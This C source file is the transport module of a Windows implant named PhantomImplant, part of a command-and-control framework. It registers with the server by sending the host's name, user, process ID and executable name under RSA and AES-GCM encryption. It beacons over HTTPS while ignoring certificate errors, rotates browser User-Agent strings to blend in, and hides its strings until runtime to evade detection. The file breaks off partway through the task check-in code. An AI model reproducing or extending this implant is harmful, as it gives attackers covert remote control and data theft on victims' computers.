/**
 * PhantomImplant - C2 Transport Module
 *
 * Implements the Phantom C2 protocol in C:
 *   Registration: RSA-OAEP-SHA256 key exchange → AES-256-GCM session
 *   Check-in:     AES-256-GCM encrypted envelopes over HTTPS
 *   Wire format:  JSON { "data": "<base64(envelope)>", "ts": <unix_ts> }
 *   Envelope:     [Version:1][Type:1][KeyID:8][PayloadLen:4][Payload:N]
 *   Serialization: Minimal msgpack (maps with string keys)
 *
 * Endpoints:
 *   POST /api/v1/auth   → Registration
 *   POST /api/v1/status → Check-in + task retrieval
 *
 * Built from Phantom C2 Go source (transport.go, envelope.go, crypto/)
 */

#include "transport.h"
#include "api.h"
#include "msgpack.h"
#include "strings.h"
#include "evasion.h"
#include "injection.h"
#include <winhttp.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <shlobj.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "crypt32.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// =============================================
// Globals
// =============================================
static HINTERNET g_hSession  = NULL;
static HINTERNET g_hConnect  = NULL;
static IMPLANT_CONFIG g_Config = { 0 };
static BOOL g_bUseHTTPS = FALSE;

static const CHAR* g_UserAgents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
};
#define NUM_USER_AGENTS (sizeof(g_UserAgents) / sizeof(g_UserAgents[0]))

// =============================================
// Base64 encode (Windows CryptBinaryToStringA)
// =============================================
DWORD Base64Encode(IN PBYTE pInput, IN DWORD dwInputLen, OUT PCHAR pOutput, IN DWORD dwOutputLen) {
    DWORD dwSize = dwOutputLen;
    if (!CryptBinaryToStringA(pInput, dwInputLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, pOutput, &dwSize))
        return 0;
    return dwSize;
}

// =============================================
// Base64 decode
// =============================================
DWORD Base64Decode(IN PCHAR pInput, IN DWORD dwInputLen, OUT PBYTE pOutput, IN DWORD dwOutputLen) {
    DWORD dwSize = dwOutputLen;
    if (!CryptStringToBinaryA(pInput, dwInputLen, CRYPT_STRING_BASE64, pOutput, &dwSize, NULL, NULL))
        return 0;
    return dwSize;
}

// =============================================
// SHA-256 → first 8 bytes = KeyID
// =============================================
VOID ComputeKeyID(IN PBYTE pKey, OUT PBYTE pKeyID) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    BYTE bHash[32] = { 0 };

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
    BCryptHashData(hHash, pKey, AES_KEY_SIZE, 0);
    BCryptFinishHash(hHash, bHash, 32, 0);

    memcpy(pKeyID, bHash, SESSION_KEYID_SIZE);

    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
}

// =============================================
// AES-256-GCM Encrypt (nonce prepended to output)
// Output: [12-byte nonce][ciphertext + 16-byte tag]
// =============================================
BOOL AesGcmEncrypt(IN PBYTE pKey, IN PBYTE pPlain, IN DWORD dwPlainSize,
                   OUT PBYTE* ppCipher, OUT DWORD* pdwCipherSize) {

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    BOOL bRet = FALSE;

    BYTE bNonce[AES_GCM_NONCE_SIZE];
    BYTE bTag[AES_GCM_TAG_SIZE];
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;

    // Generate random nonce
    BCryptGenRandom(NULL, bNonce, AES_GCM_NONCE_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) goto _Done;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!NT_SUCCESS(status)) goto _Done;

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pKey, AES_KEY_SIZE, 0);
    if (!NT_SUCCESS(status)) goto _Done;

    // Setup GCM auth info
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = bNonce;
    authInfo.cbNonce = AES_GCM_NONCE_SIZE;
    authInfo.pbTag = bTag;
    authInfo.cbTag = AES_GCM_TAG_SIZE;

    // Encrypt
    DWORD dwCipherLen = 0;
    PBYTE pCipherBuf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwPlainSize);
    if (!pCipherBuf) goto _Done;

    status = BCryptEncrypt(hKey, pPlain, dwPlainSize, &authInfo, NULL, 0, pCipherBuf, dwPlainSize, &dwCipherLen, 0);
    if (!NT_SUCCESS(status)) {
        HeapFree(GetProcessHeap(), 0, pCipherBuf);
        goto _Done;
    }

    // Build output: [nonce][ciphertext][tag]
    DWORD dwTotalSize = AES_GCM_NONCE_SIZE + dwCipherLen + AES_GCM_TAG_SIZE;
    PBYTE pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwTotalSize);
    if (!pOutput) {
        HeapFree(GetProcessHeap(), 0, pCipherBuf);
        goto _Done;
    }

    memcpy(pOutput, bNonce, AES_GCM_NONCE_SIZE);
    memcpy(pOutput + AES_GCM_NONCE_SIZE, pCipherBuf, dwCipherLen);
    memcpy(pOutput + AES_GCM_NONCE_SIZE + dwCipherLen, bTag, AES_GCM_TAG_SIZE);

    HeapFree(GetProcessHeap(), 0, pCipherBuf);

    *ppCipher = pOutput;
    *pdwCipherSize = dwTotalSize;
    bRet = TRUE;

_Done:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return bRet;
}

// =============================================
// AES-256-GCM Decrypt
// Input: [12-byte nonce][ciphertext][16-byte tag]
// =============================================
BOOL AesGcmDecrypt(IN PBYTE pKey, IN PBYTE pCipher, IN DWORD dwCipherSize,
                   OUT PBYTE* ppPlain, OUT DWORD* pdwPlainSize) {

    if (dwCipherSize < AES_GCM_NONCE_SIZE + AES_GCM_TAG_SIZE)
        return FALSE;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    BOOL bRet = FALSE;

    PBYTE pNonce = pCipher;
    DWORD dwDataLen = dwCipherSize - AES_GCM_NONCE_SIZE - AES_GCM_TAG_SIZE;
    PBYTE pData = pCipher + AES_GCM_NONCE_SIZE;
    PBYTE pTag = pCipher + AES_GCM_NONCE_SIZE + dwDataLen;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) goto _Done;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!NT_SUCCESS(status)) goto _Done;

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pKey, AES_KEY_SIZE, 0);
    if (!NT_SUCCESS(status)) goto _Done;

    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = pNonce;
    authInfo.cbNonce = AES_GCM_NONCE_SIZE;
    authInfo.pbTag = pTag;
    authInfo.cbTag = AES_GCM_TAG_SIZE;

    PBYTE pPlainBuf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwDataLen);
    if (!pPlainBuf) goto _Done;

    DWORD dwPlainLen = 0;
    status = BCryptDecrypt(hKey, pData, dwDataLen, &authInfo, NULL, 0, pPlainBuf, dwDataLen, &dwPlainLen, 0);
    if (!NT_SUCCESS(status)) {
        HeapFree(GetProcessHeap(), 0, pPlainBuf);
        goto _Done;
    }

    *ppPlain = pPlainBuf;
    *pdwPlainSize = dwPlainLen;
    bRet = TRUE;

_Done:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return bRet;
}

// =============================================
// RSA-OAEP-SHA256 Encrypt
// =============================================
BOOL RsaOaepEncrypt(IN PBYTE pPubKeyDer, IN DWORD dwPubKeyLen,
                    IN PBYTE pPlain, IN DWORD dwPlainSize,
                    OUT PBYTE* ppCipher, OUT DWORD* pdwCipherSize) {

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    BOOL bRet = FALSE;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) goto _Done;

    // Import DER-encoded public key
    status = BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPUBLIC_BLOB, &hKey, pPubKeyDer, dwPubKeyLen, 0);
    if (!NT_SUCCESS(status)) {
        // Try PKCS1 format
        // Decode DER to CERT_PUBLIC_KEY_INFO first
        CERT_PUBLIC_KEY_INFO* pPubKeyInfo = NULL;
        DWORD dwPubKeyInfoLen = 0;

        if (CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO,
            pPubKeyDer, dwPubKeyLen, CRYPT_DECODE_ALLOC_FLAG, NULL, &pPubKeyInfo, &dwPubKeyInfoLen)) {

            if (!CryptImportPublicKeyInfoEx2(X509_ASN_ENCODING, pPubKeyInfo, 0, NULL, &hKey)) {
                LocalFree(pPubKeyInfo);
                goto _Done;
            }
            LocalFree(pPubKeyInfo);
        } else {
            goto _Done;
        }
    }

    // OAEP padding with SHA-256
    BCRYPT_OAEP_PADDING_INFO padInfo = { BCRYPT_SHA256_ALGORITHM, NULL, 0 };

    // Get required output size
    DWORD dwCipherLen = 0;
    status = BCryptEncrypt(hKey, pPlain, dwPlainSize, &padInfo, NULL, 0, NULL, 0, &dwCipherLen, BCRYPT_PAD_OAEP);
    if (!NT_SUCCESS(status)) goto _Done;

    PBYTE pCipherBuf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwCipherLen);
    if (!pCipherBuf) goto _Done;

    status = BCryptEncrypt(hKey, pPlain, dwPlainSize, &padInfo, NULL, 0, pCipherBuf, dwCipherLen, &dwCipherLen, BCRYPT_PAD_OAEP);
    if (!NT_SUCCESS(status)) {
        HeapFree(GetProcessHeap(), 0, pCipherBuf);
        goto _Done;
    }

    *ppCipher = pCipherBuf;
    *pdwCipherSize = dwCipherLen;
    bRet = TRUE;

_Done:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return bRet;
}

// =============================================
// Build Envelope bytes: [Ver:1][Type:1][KeyID:8][Len:4][Payload:N]
// =============================================
static DWORD BuildEnvelope(BYTE bVersion, BYTE bType, PBYTE pKeyID, PBYTE pPayload, DWORD dwPayloadLen, PBYTE pOutput) {
    DWORD offset = 0;
    pOutput[offset++] = bVersion;
    pOutput[offset++] = bType;
    memcpy(pOutput + offset, pKeyID, SESSION_KEYID_SIZE);
    offset += SESSION_KEYID_SIZE;

    // Big-endian payload length
    pOutput[offset++] = (BYTE)((dwPayloadLen >> 24) & 0xFF);
    pOutput[offset++] = (BYTE)((dwPayloadLen >> 16) & 0xFF);
    pOutput[offset++] = (BYTE)((dwPayloadLen >> 8) & 0xFF);
    pOutput[offset++] = (BYTE)(dwPayloadLen & 0xFF);

    memcpy(pOutput + offset, pPayload, dwPayloadLen);
    offset += dwPayloadLen;
    return offset;
}

// =============================================
// Wrap envelope in JSON: {"data":"<base64>","ts":<unix>}
// =============================================
static DWORD WrapForHTTP(PBYTE pEnvelope, DWORD dwEnvLen, PCHAR pJsonOutput, DWORD dwJsonSize) {
    // Base64 encode the envelope
    CHAR szBase64[8192] = { 0 };
    DWORD dwB64Len = Base64Encode(pEnvelope, dwEnvLen, szBase64, sizeof(szBase64));
    if (dwB64Len == 0) return 0;

    // Build JSON
    DWORD dwWritten = (DWORD)sprintf_s(pJsonOutput, dwJsonSize,
        "{\"data\":\"%s\",\"ts\":%lld}", szBase64, (long long)time(NULL));
    return dwWritten;
}

// =============================================
// Minimal msgpack encoder for registration
// Encodes a flat map of string keys → string values
// =============================================
static DWORD MsgpackEncodeRegistration(
    PCHAR szHostname, PCHAR szUsername, PCHAR szOS, PCHAR szArch,
    DWORD dwPID, PCHAR szProcessName, PCHAR szInternalIP,
    PBYTE pOutput, DWORD dwOutputSize) {

    DWORD offset = 0;

    // fixmap with 7 entries: 0x87
    pOutput[offset++] = 0x80 | 7;

    // Helper macro: write fixstr key + fixstr value
    #define MSGPACK_STR(key, val) do { \
        DWORD klen = (DWORD)strlen(key); \
        DWORD vlen = (DWORD)strlen(val); \
        pOutput[offset++] = 0xA0 | (klen & 0x1F); \
        memcpy(pOutput + offset, key, klen); offset += klen; \
        if (vlen <= 31) { \
            pOutput[offset++] = 0xA0 | (vlen & 0x1F); \
        } else { \
            pOutput[offset++] = 0xD9; \
            pOutput[offset++] = (BYTE)vlen; \
        } \
        memcpy(pOutput + offset, val, vlen); offset += vlen; \
    } while(0)

    // Write key-value pairs (runtime-decrypted field names)
    #define MSGPACK_ENC_STR(encArr, encLen, val) do { \
        CHAR _k[32]; memcpy(_k, encArr, encLen + 1); \
        DecryptString(_k, encLen); \
        MSGPACK_STR(_k, val); \
        ZeroString(_k, encLen); \
    } while(0)

    MSGPACK_ENC_STR(g_EncHostname, ENC_HOSTNAME_LEN, szHostname);
    MSGPACK_ENC_STR(g_EncUsername, ENC_USERNAME_LEN, szUsername);
    MSGPACK_ENC_STR(g_EncOs, ENC_OS_LEN, szOS);
    MSGPACK_ENC_STR(g_EncArch, ENC_ARCH_LEN, szArch);

    // PID as uint32: decrypted key + uint32 value
    {
        CHAR pidKey[8]; memcpy(pidKey, g_EncPid, ENC_PID_LEN + 1);
        DecryptString(pidKey, ENC_PID_LEN);
        DWORD klen = ENC_PID_LEN;
        pOutput[offset++] = 0xA0 | klen;
        memcpy(pOutput + offset, pidKey, klen); offset += klen;
        ZeroString(pidKey, ENC_PID_LEN);
        pOutput[offset++] = 0xCE; // uint32
        pOutput[offset++] = (BYTE)((dwPID >> 24) & 0xFF);
        pOutput[offset++] = (BYTE)((dwPID >> 16) & 0xFF);
        pOutput[offset++] = (BYTE)((dwPID >> 8) & 0xFF);
        pOutput[offset++] = (BYTE)(dwPID & 0xFF);
    }

    MSGPACK_ENC_STR(g_EncProcessName, ENC_PROCESS_NAME_LEN, szProcessName);
    MSGPACK_ENC_STR(g_EncInternalIp, ENC_INTERNAL_IP_LEN, szInternalIP);
    #undef MSGPACK_ENC_STR

    #undef MSGPACK_STR
    return offset;
}

// =============================================
// Collect system information
// =============================================
VOID CollectSysInfo(PCHAR szHostname, PCHAR szUsername, PCHAR szOS,
                           PCHAR szArch, DWORD* pdwPID, PCHAR szProcessName, PCHAR szIP) {
    DWORD dwSize;

    // Hostname
    dwSize = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameA(szHostname, &dwSize);

    // Username
    dwSize = 256;
    GetUserNameA(szUsername, &dwSize);

    // OS
    strcpy(szOS, "windows");

    // Arch
#ifdef _WIN64
    strcpy(szArch, "amd64");
#else
    strcpy(szArch, "x86");
#endif

    // PID
    *pdwPID = GetCurrentProcessId();

    // Process name (just use our own exe name)
    GetModuleFileNameA(NULL, szProcessName, MAX_PATH);
    // Extract just the filename
    PCHAR pSlash = strrchr(szProcessName, '\\');
    if (pSlash) memmove(szProcessName, pSlash + 1, strlen(pSlash + 1) + 1);

    // Internal IP (simplified - use 127.0.0.1 as fallback)
    strcpy(szIP, "127.0.0.1");
}

// =============================================
// HTTP POST to server
// =============================================
static BOOL HttpPost(PCHAR szPath, PBYTE pBody, DWORD dwBodyLen, PBYTE* ppResponse, DWORD* pdwResponseLen) {

    HINTERNET hRequest = NULL;
    BOOL bRet = FALSE;

    // Convert path to wide string
    WCHAR wszPath[256] = { 0 };
    MultiByteToWideChar(CP_UTF8, 0, szPath, -1, wszPath, 256);

    // Pick random User-Agent
    WCHAR wszUA[512] = { 0 };
    MultiByteToWideChar(CP_UTF8, 0, g_UserAgents[GetTickCount() % NUM_USER_AGENTS], -1, wszUA, 512);

    // Use HTTPS flag only if server URL starts with https://
    DWORD dwReqFlags = g_bUseHTTPS ? WINHTTP_FLAG_SECURE : 0;
    hRequest = WinHttpOpenRequest(g_hConnect, L"POST", wszPath, NULL, WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES, dwReqFlags);
    if (!hRequest) return FALSE;

    // Ignore certificate errors for HTTPS (self-signed C2 certs)
    if (g_bUseHTTPS) {
        DWORD dwSecFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));
    }

    // Set headers (Content-Type decrypted at runtime)
    CHAR szCT[64]; memcpy(szCT, g_EncContentType, ENC_CONTENT_TYPE_LEN + 1);
    DecryptString(szCT, ENC_CONTENT_TYPE_LEN);
    WCHAR wszCT[64] = { 0 };
    MultiByteToWideChar(CP_UTF8, 0, szCT, -1, wszCT, 64);
    ZeroString(szCT, ENC_CONTENT_TYPE_LEN);
    WinHttpAddRequestHeaders(hRequest, wszCT, -1, WINHTTP_ADDREQ_FLAG_ADD);

    WCHAR wszUAHeader[600] = { 0 };
    wsprintfW(wszUAHeader, L"User-Agent: %s", wszUA);
    WinHttpAddRequestHeaders(hRequest, wszUAHeader, -1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    // Send request
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, pBody, dwBodyLen, dwBodyLen, 0))
        goto _Done;

    if (!WinHttpReceiveResponse(hRequest, NULL))
        goto _Done;

    // Read response
    DWORD dwTotalRead = 0;
    DWORD dwBufSize = 4096;
    PBYTE pBuf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwBufSize);
    if (!pBuf) goto _Done;

    DWORD dwBytesRead = 0;
    while (WinHttpReadData(hRequest, pBuf + dwTotalRead, dwBufSize - dwTotalRead - 1, &dwBytesRead)) {
        if (dwBytesRead == 0) break;
        dwTotalRead += dwBytesRead;
        if (dwTotalRead >= dwBufSize - 256) {
            dwBufSize *= 2;
            PBYTE pNew = (PBYTE)HeapReAlloc(GetProcessHeap(), 0, pBuf, dwBufSize);
            if (!pNew) { HeapFree(GetProcessHeap(), 0, pBuf); goto _Done; }
            pBuf = pNew;
        }
    }
    pBuf[dwTotalRead] = '\0';

    *ppResponse = pBuf;
    *pdwResponseLen = dwTotalRead;
    bRet = TRUE;

_Done:
    if (hRequest) WinHttpCloseHandle(hRequest);
    return bRet;
}

// =============================================
// TransportInit - Setup WinHTTP session
// =============================================
BOOL TransportInit(PIMPLANT_CONFIG pConfig) {
    memcpy(&g_Config, pConfig, sizeof(IMPLANT_CONFIG));

    // Parse URL to extract host and port
    WCHAR wszHost[256] = { 0 };
    INTERNET_PORT nPort = INTERNET_DEFAULT_HTTPS_PORT;

    // Simple URL parse: skip "https://" then extract host:port
    PCHAR pHost = g_Config.szServerURL;
    if (strncmp(pHost, "https://", 8) == 0) { pHost += 8; g_bUseHTTPS = TRUE; }
    else if (strncmp(pHost, "http://", 7) == 0) { pHost += 7; nPort = INTERNET_DEFAULT_HTTP_PORT; g_bUseHTTPS = FALSE; }

    CHAR szHost[256] = { 0 };
    PCHAR pColon = strchr(pHost, ':');
    if (pColon) {
        strncpy(szHost, pHost, pColon - pHost);
        nPort = (INTERNET_PORT)atoi(pColon + 1);
    } else {
        PCHAR pSlash = strchr(pHost, '/');
        if (pSlash) strncpy(szHost, pHost, pSlash - pHost);
        else strcpy(szHost, pHost);
    }

    MultiByteToWideChar(CP_UTF8, 0, szHost, -1, wszHost, 256);

    g_hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                             WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!g_hSession) return FALSE;

    g_hConnect = WinHttpConnect(g_hSession, wszHost, nPort, 0);
    if (!g_hConnect) return FALSE;

    return TRUE;
}

// =============================================
// TransportRegister - RSA key exchange + registration
// =============================================
BOOL TransportRegister(PSESSION pSession) {

    // 1. Generate random AES-256 session key
    BCryptGenRandom(NULL, pSession->bSessionKey, AES_KEY_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    // 2. Compute KeyID = SHA256(session_key)[:8]
    ComputeKeyID(pSession->bSessionKey, pSession->bKeyID);

    // 3. Collect system info
    CHAR szHostname[256] = { 0 }, szUsername[256] = { 0 }, szOS[32] = { 0 };
    CHAR szArch[16] = { 0 }, szProcessName[MAX_PATH] = { 0 }, szIP[64] = { 0 };
    DWORD dwPID = 0;
    CollectSysInfo(szHostname, szUsername, szOS, szArch, &dwPID, szProcessName, szIP);

    // 4. Msgpack serialize registration
    BYTE bMsgpack[2048] = { 0 };
    DWORD dwMsgpackLen = MsgpackEncodeRegistration(szHostname, szUsername, szOS, szArch,
                                                    dwPID, szProcessName, szIP,
                                                    bMsgpack, sizeof(bMsgpack));

    // 5. Build blob: [32-byte AES key][msgpack payload]
    DWORD dwBlobLen = AES_KEY_SIZE + dwMsgpackLen;
    PBYTE pBlob = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwBlobLen);
    memcpy(pBlob, pSession->bSessionKey, AES_KEY_SIZE);
    memcpy(pBlob + AES_KEY_SIZE, bMsgpack, dwMsgpackLen);

    // 6. RSA-OAEP encrypt blob with server's public key
    PBYTE pEncrypted = NULL;
    DWORD dwEncryptedLen = 0;
    BOOL bResult = RsaOaepEncrypt(g_Config.bServerPubKey, g_Config.dwServerPubKeyLen,
                                   pBlob, dwBlobLen, &pEncrypted, &dwEncryptedLen);
    HeapFree(GetProcessHeap(), 0, pBlob);
    if (!bResult) return FALSE;

    // 7. Build envelope
    BYTE bEnvelope[4096] = { 0 };
    BYTE bEmptyKeyID[SESSION_KEYID_SIZE] = { 0 };
    DWORD dwEnvLen = BuildEnvelope(PHANTOM_PROTOCOL_VERSION, MSG_REGISTER_REQUEST,
                                    bEmptyKeyID, pEncrypted, dwEncryptedLen, bEnvelope);
    HeapFree(GetProcessHeap(), 0, pEncrypted);

    // 8. Wrap in JSON
    CHAR szJson[16384] = { 0 };
    DWORD dwJsonLen = WrapForHTTP(bEnvelope, dwEnvLen, szJson, sizeof(szJson));
    if (dwJsonLen == 0) return FALSE;

    // 9. POST to /api/v1/auth (decrypted at runtime)
    PBYTE pResponse = NULL;
    DWORD dwResponseLen = 0;
    CHAR szRegURI[32]; memcpy(szRegURI, g_EncRegisterURI, ENC_REGISTER_URI_LEN + 1);
    DecryptString(szRegURI, ENC_REGISTER_URI_LEN);
    BOOL bPostOk = HttpPost(szRegURI, (PBYTE)szJson, dwJsonLen, &pResponse, &dwResponseLen);
    ZeroString(szRegURI, ENC_REGISTER_URI_LEN);
    if (!bPostOk) return FALSE;

    // 10. Parse response: JSON → base64 → envelope → AES-GCM decrypt → msgpack
    if (!pResponse || dwResponseLen == 0) return FALSE;

    CHAR szMarker[16]; memcpy(szMarker, g_EncDataMarker, ENC_DATA_MARKER_LEN + 1);
    DecryptString(szMarker, ENC_DATA_MARKER_LEN);
    PCHAR pDataStart = strstr((PCHAR)pResponse, szMarker);
    ZeroString(szMarker, ENC_DATA_MARKER_LEN);
    if (!pDataStart) { HeapFree(GetProcessHeap(), 0, pResponse); return FALSE; }
    pDataStart += ENC_DATA_MARKER_LEN;

    PCHAR pDataEnd = strchr(pDataStart, '"');
    if (!pDataEnd) { HeapFree(GetProcessHeap(), 0, pResponse); return FALSE; }

    DWORD dwB64Len = (DWORD)(pDataEnd - pDataStart);
    BYTE bEnvBuf[4096] = { 0 };
    DWORD dwRespEnvLen = Base64Decode(pDataStart, dwB64Len, bEnvBuf, sizeof(bEnvBuf));
    HeapFree(GetProcessHeap(), 0, pResponse);

    if (dwRespEnvLen < 14) return FALSE;

    BYTE bRespType = bEnvBuf[1];
    if (bRespType != MSG_REGISTER_RESPONSE) return FALSE;

    DWORD dwPayloadLen = (bEnvBuf[10] << 24) | (bEnvBuf[11] << 16) | (bEnvBuf[12] << 8) | bEnvBuf[13];
    if (14 + dwPayloadLen > dwRespEnvLen) return FALSE;

    PBYTE pEncPayload2 = bEnvBuf + 14;
    PBYTE pDecrypted = NULL;
    DWORD dwDecryptedLen = 0;
    if (!AesGcmDecrypt(pSession->bSessionKey, pEncPayload2, dwPayloadLen, &pDecrypted, &dwDecryptedLen))
        return FALSE;

    INT nSleep = 10, nJitter = 20;
    CHAR szName[64] = { 0 };
    BOOL bParsed = MsgpackParseRegisterResponse(pDecrypted, dwDecryptedLen,
        pSession->szAgentID, sizeof(pSession->szAgentID),
        szName, sizeof(szName), &nSleep, &nJitter);
    HeapFree(GetProcessHeap(), 0, pDecrypted);

    if (bParsed) {
        strncpy(pSession->szAgentName, szName, sizeof(pSession->szAgentName) - 1);
        pSession->dwSleepMs = (DWORD)(nSleep * 1000);
        pSession->dwJitterPct = (DWORD)nJitter;
    } else {
        strcpy(pSession->szAgentID, "unknown");
        pSession->dwSleepMs = g_Config.dwSleepMs;
        pSession->dwJitterPct = g_Config.dwJitterPct;
    }
    pSession->bRegistered = TRUE;
    return TRUE;
}

// =============================================
// TransportCheckIn - Send results, receive tasks
// All buffers heap-allocated to support large output (screenshots etc.)
// =============================================
BOOL TransportCheckIn(PSESSION pSession, PC2_RESULT pResults, DWORD dwResultCount,
                      PC2_TASK* ppTasks, DWORD* pdwTaskCount) {

    // 1. Calculate payload size: base + per-result overhead + output data
    DWORD dwPayloadSize = 256; // base (agent_id key/val + map header + results key)
    for (DWORD i = 0; i < dwResultCount; i++) {
        dwPayloadSize += 256; // per-result overhead (keys + uuid strings + map headers)
        if (pResults[i].pOutput && pResults[i].dwOutputLen > 0)
            dwPayloadSize += pResults[i].dwOutputLen;
    }
    dwPayloadSize += 64; // safety

    PBYTE pPayload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPayloadSize);
    if (!pPayload) return FALSE;

    DWORD offset = 0;
    DWORD aidLen = (DWORD)strlen(pSession->szAgentID);

    // fixmap with 2 keys: agent_id + results
    pPayload[offset++] = 0x82;

    // key: "agent_id" (8 chars → fixstr)
    pPayload[offset++] = 0xA8;
    memcpy(pPayload + offset, "agent_id", 8); offset += 8;
    // val: agent_id string (36 chars → str8)
    pPayload[offset++] = 0xD9;
    pPayload[offset++] = (BYTE)aidLen;
    memcpy(pPayload + offset, pSession->szAgentID, aidLen); offset += aidLen;

    // key: "results" (7 chars → fixstr)
    pPayload[offset++] = 0xA7;
    memcpy(pPayload + offset, "results", 7); offset += 7;

    // val: fixarray of results
    DWORD n = (dwResultCount > 15) ? 15 : dwResultCount;
    pPayload[offset++] = 0x90 | (BYTE)n;

    for (DWORD i = 0; i < n; i++) {
        PC2_RESULT res = &pResults[i];
        BOOL bHasOut = (res->pOutput && res->dwOutputLen > 0);
        BOOL bHasErr = (res->szError[0] != '\0');
        BYTE fields = 2 + (bHasOut ? 1 : 0) + (bHasErr ? 1 : 0);

        pPayload[offset++] = 0x80 | fields;

        // task_id
        pPayload[offset++] = 0xA7;
        memcpy(pPayload + offset, "task_id", 7); offset += 7;
        DWORD tidLen = (DWORD)strlen(res->szTaskID);
        pPayload[offset++] = 0xD9; pPayload[offset++] = (BYTE)tidLen;
        memcpy(pPayload + offset, res->szTaskID, tidLen); offset += tidLen;

        // agent_id
        pPayload[offset++] = 0xA8;
        memcpy(pPayload + offset, "agent_id", 8); offset += 8;
        pPayload[offset++] = 0xD9; pPayload[offset++] = (BYTE)aidLen;
        memcpy(pPayload + offset, pSession->szAgentID, aidLen); offset += aidLen;

        // output (binary)
        if (bHasOut) {
            pPayload[offset++] = 0xA6;
            memcpy(pPayload + offset, "output", 6); offset += 6;
            DWORD outLen = res->dwOutputLen;
            if (outLen > 65535) outLen = 65535;
            if (outLen <= 255) {
                pPayload[offset++] = 0xC4; pPayload[offset++] = (BYTE)outLen;
            } else {
                pPayload[offset++] = 0xC5;
                pPayload[offset++] = (BYTE)(outLen >> 8);
                pPayload[offset++] = (BYTE)(outLen & 0xFF);
            }
            memcpy(pPayload + offset, res->pOutput, outLen); offset += outLen;
        }

        // error (string)
        if (bHasErr) {
            pPayload[offset++] = 0xA5;
            memcpy(pPayload + offset, "error", 5); offset += 5;
            DWORD errLen = (DWORD)strlen(res->szError);
            if (errLen <= 31) {
